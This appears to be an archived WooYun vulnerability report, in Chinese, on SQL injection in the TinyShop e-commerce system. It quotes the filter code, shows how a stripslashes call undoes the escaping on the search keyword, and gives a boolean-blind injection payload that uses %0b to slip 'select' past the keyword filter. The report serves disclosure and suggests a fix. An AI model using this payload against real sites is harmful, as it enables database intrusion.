{"id": 50867, "wybug_id": "wooyun-2014-076537", "wybug_title": "TinyShop SQL注入（开启GPC，绕过过滤）", "wybug_corp": "tinyrise.com", "wybug_author": "xiaoL", "wybug_date": "2014-09-19 12:30", "wybug_open_date": "2014-12-15 12:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-19：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向公众公开  简要描述： 之前的都是找程序员的疏忽，这个位置是绕过程序的防注入。 详细说明：  环境：GPC = On\npublic static function sql($str)  //过滤函数\t{\t\tif (!get_magic_quotes_gpc()){ //gpc off 就转义，把之前那个奇葩的漏洞补了\t\t\t//不使用主要是因为，先有mysql的连接\t\t\t//$str =  mysql_real_escape_string($str);\t\t\t$str = addslashes($str);\t\t}\t\t$str = preg_replace('/([^a-z]+)(select|insert|update|delete|union|into|load_file|outfile|tiny_)/i', '&#160;$2', $str);  //这个过滤是可以绕过的\t\treturn $str;\t}\n仔细找发现过滤函数中存在另外一个函数：text内容如下：\n/**@param $str 字符串\t* @return 字符串\t*@note 处理HTML编辑器的内容，主要是解决JavaScript的注入问题\t*/\t\tpublic static function text($str)\t{\t\t$config = HTMLPurifier_Config::createDefault();\t    $cache_dir=Tiny::getPath('cache').\"/htmlpurifier/\";\t\tif(!file_exists($cache_dir))\t\t{\t\t\tFile::mkdir($cache_dir);\t\t}\t\t$config = HTMLPurifier_Config::createDefault();\t\t//配置 缓存目录\t\t$config->set('Cache.SerializerPath',$cache_dir); //设置cache目录\t\t\t\t\t//配置 允许flash\t\t$config->set('HTML.SafeEmbed',true);\t\t$config->set('HTML.SafeObject',true);\t\t$config->set('Output.FlashCompat',true);\t\t//$config->set('HTML.Allowed', 'p');\t\t//$config->set('AutoFormat.AutoParagraph', true);\t\t//$config->set('AutoFormat.RemoveEmpty', true);\t\t//允许<a>的target属性\t\t$def = $config->getHTMLDefinition(true);\t\t$def->addAttribute('a', 'target', 'Enum#_blank,_self,_target,_top');\t\t\t\t$purifier = new HTMLPurifier($config);\t\tif (get_magic_quotes_gpc())$str = stripslashes($str); //漏洞发生的位置，如果开启了gpc，则反转义一次。\t\t$str = $purifier->purify($str);\t    return  $str;\t}\n其中对gpc进行一次检查，反转义了。于是去找一个使用text的点。在代码protected\\controllers\\index.php中：\n//搜索与分类的条件解析    private function parseCondition()    {        $page = intval(Req::args(\"p\"));        $page_size = 36;        $sort = Filter::int(Req::args(\"sort\"));        $sort = $sort==null?0:$sort;        $cid = Filter::int(Req::args(\"cid\"));        $cid = $cid==null?0:$cid;        $brand = Req::args(\"brand\");        $price = Req::args(\"price\");        $keyword = urldecode(Req::args('keyword'));        $keyword = Filter::sql($keyword); //经过了sql        $keyword = Filter::text($keyword); //但是经过text之后，\\' => ' 又变回去了，成功闭合了下面的fndAll函数。        //初始化数据        $attrs = $specs = $spec_attr = $category_child = $spec_attr_selected = $selected = $has_category = $category = $current_category = array();        $where = $spec_attr_where = $url = \"\";        $condition_num = 0;        $model = $this->model;        //基本条件的建立        //关于搜索的处理        $action = strtolower(Req::args(\"act\"));        if($action=='search'){            //关于类型的处理            ////提取商品下的类型            $seo_title = $seo_keywords = $keyword;            $where = \"name like '%$keyword%'\";                $rows = $model->table(\"goods\")->fields(\"category_id,count(id) as num\")->where($where)->group(\"category_id\")->findAll(); //带入了这里进行查询                $category_ids = \"\";                $category_count = array();                foreach ($rows as $row) {                    $category_ids .= $row['category_id'].',';                    $category_count[$row['category_id']] = $row['num'];                }                $category_ids = trim($category_ids,\",\");                $has_category = array();                $seo_description = '';                if($category_ids){                    $rows = $model->table(\"goods_category\")->where(\"id in ($category_ids)\")->findAll();                    foreach ($rows as $row) {                        $path = trim($row['path'],',');                        $paths = explode(',', $path);                        $root = 0;                        if(is_array($paths)) $root = $paths[0];                        $row['num'] = $category_count[$row['id']];                        $has_category[$root][] = $row;                        $seo_description .= $row['name'].',';                    }                }            if($cid!=0){                $where = \"category_id=$cid and name like '%$keyword%'\";                $category = $model->table(\"goods_category as gc \")->join(\"left join goods_type as gt on gc.type_id = gt.id\")->where(\"gc.id=$cid\")->find();                if($category){                    $attrs = unserialize($category['attr']);                    $specs = unserialize($category['spec']);                    if($category['seo_title']!='') $seo_title = $category['seo_title'];                    else $seo_title = $category['name'];                    if($category['seo_keywords']!='') $seo_keywords = $category['seo_keywords'];                    if($category['seo_description']!='') $seo_description = $category['seo_description'];                }            }                    //关于分类检索的处理        }\n看注释。   漏洞证明：  由于SQL函数过滤不严可以适应%0b插入关键字绕过。最终使用keyword=MacBook Air%' and (ord(substring((sel%0bect user()) from 1 for 1))=114)-- 1来bool瞩目默认用户是root真：\n\n假：\n\n\n\n   修复方案：  修复text函数   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-15 12:32 厂商回复： 谢谢你的反馈，别人已经提交过了，不过还是感谢的你支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}